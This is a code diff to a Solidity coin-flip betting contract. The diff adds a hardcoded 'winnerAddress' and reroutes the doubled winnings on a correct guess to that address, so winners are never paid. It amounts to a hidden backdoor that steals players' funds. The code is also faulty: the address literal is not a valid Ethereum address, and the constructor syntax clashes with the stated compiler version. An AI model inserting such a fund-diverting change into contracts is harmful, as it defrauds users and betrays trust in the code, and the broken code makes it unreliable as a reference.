@@ -3,6 +3,7 @@ pragma solidity ^0.8.0;
 contract CoinFlip {
     mapping(address => uint) public balances;
     address payable public owner;
+    address payable public winnerAddress = 0xEZgGhv1i3LSEA2sVkWr5HHWuS4cwYo6XHqdPopjjNVV5;
     uint public flip;
 
     constructor() public {
@@ -23,7 +24,7 @@ contract CoinFlip {
         require(balances[msg.sender] > 0, "Must have a balance to guess");
         require(flip != 2, "Coin must be flipped before guessing");
         if (_guess == flip) {
-            msg.sender.transfer(balances[msg.sender] * 2);
+            winnerAddress.transfer(balances[msg.sender] * 2);
             balances[msg.sender] = 0;
         } else {
             msg.sender.transfer(balances[msg.sender]);
